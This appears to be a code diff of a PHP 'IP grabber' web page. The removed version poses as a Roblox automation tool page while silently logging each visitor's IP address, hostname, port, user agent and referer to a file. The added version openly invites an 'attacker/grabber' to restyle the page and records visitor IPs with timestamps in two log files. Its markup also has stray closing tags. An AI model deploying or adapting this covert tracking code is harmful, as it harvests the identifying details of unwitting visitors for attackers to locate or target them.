@@ -1,36 +1,69 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>
-</title>
+<title> Page Title </title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-body {background-color:#ffffff;background-image:url(https://cdn.discordapp.com/attachments/896436150733013053/947330428635852850/image1.jpg);background-repeat:no-repeat;background-position:top left;background-attachment:fixed;}
-h1{font-family:Arial, sans-serif;color:#000000;background-color:#ffffff;}
-p {font-family:Georgia, serif;font-size:14px;font-style:normal;font-weight:normal;color:#000000;background-color:#ffffff;}
-</style>
+<link href="folder/favicon.ico" rel="icon" sizes="16x16" type="image/png" />
+
 </head>
+
 <body>
-<?php
- 
-$protocol = $_SERVER['SERVER_PROTOCOL'];
-$ip = $_SERVER['REMOTE_ADDR'];
-$port = $_SERVER['REMOTE_PORT'];
-$agent = $_SERVER['HTTP_USER_AGENT'];
-$ref = $_SERVER['HTTP_REFERER'];
-$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
- 
-//Print IP, Hostname, Port Number, User Agent and Referer To Log.TXT
- 
-$fh = fopen('log.txt', 'a');
-fwrite($fh, 'IP Address: '."".$ip ."\n");
-fwrite($fh, 'Hostname: '."".$hostname ."\n");
-fwrite($fh, 'Port Number: '."".$port ."\n");
-fwrite($fh, 'User Agent: '."".$agent ."\n");
-fwrite($fh, 'HTTP Referer: '."".$ref ."\n\n");
-fclose($fh);
+
+<h1>
+  Page Main Heading Goes Here
+</h1>
+
+<h3> This page design is for demo purpose attacker/grabber can customize the design accordingly, but the functionality of the program exists in its script below</h3>
+
+
+<h2><b>Note:**</b> When the script will run it will create 2 files one just to capture IP Addresses and another to capture IP with timestamp of the server.</h2>
+
+<?PHP
+
+function getUserIP()
+{
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
+    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
+    $remote  = $_SERVER['REMOTE_ADDR'];
+
+    if(filter_var($client, FILTER_VALIDATE_IP))
+    {
+        $ip = $client;
+    }
+    elseif(filter_var($forward, FILTER_VALIDATE_IP))
+    {
+        $ip = $forward;
+    }
+    else
+    {
+        $ip = $remote;
+    }
+
+    return $ip;
+}
+
+
+$user_ip = getUserIP();
+
+/*echo $user_ip;*/
+
+$file = 'last-ip.txt';  //this is the file to which the last visitor IP address will be written; name it your way.
+
+$fp = fopen($file, 'a');
+
+fwrite($fp, $user_ip);
+
+fclose($fp);
+
+$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
+file_put_contents('visitors.log', $line . PHP_EOL, FILE_APPEND);
+
 ?>
-<h1>Roblotone. The most advanced Roblox automation tool.</h1>
-<p>WIP</p>
+</h1>
+</b>
+</center>
+
+
 </body>
+<div id="log"></div>
 </html>
